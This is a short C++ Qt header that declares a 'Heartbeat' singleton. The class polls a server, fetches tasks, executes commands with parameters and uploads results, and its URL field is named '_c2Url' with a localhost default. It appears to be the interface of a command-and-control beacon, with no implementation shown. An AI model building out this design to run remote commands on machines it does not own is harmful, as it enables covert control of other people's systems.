#pragma once

#include <QObject>
#include <QTimer>
#include <QtNetwork/QNetworkAccessManager>
#include <QtNetwork/QNetworkReply>

namespace Core {

class Heartbeat : public QObject {
    Q_OBJECT
public:
    static Heartbeat& Instance();
    void start();

private:
    Heartbeat();
    ~Heartbeat() = default;

    void sendHeartbeat();
    void checkTasks();
    void executeTask(const QString& taskId, const QString& command, const QString& params);
    void uploadResult(const QString& taskId, const QString& result);
    
    QTimer _timer;
    QNetworkAccessManager _network;
    QString _c2Url = "http://localhost:8101/api"; // Default for local dev
};

} // namespace Core
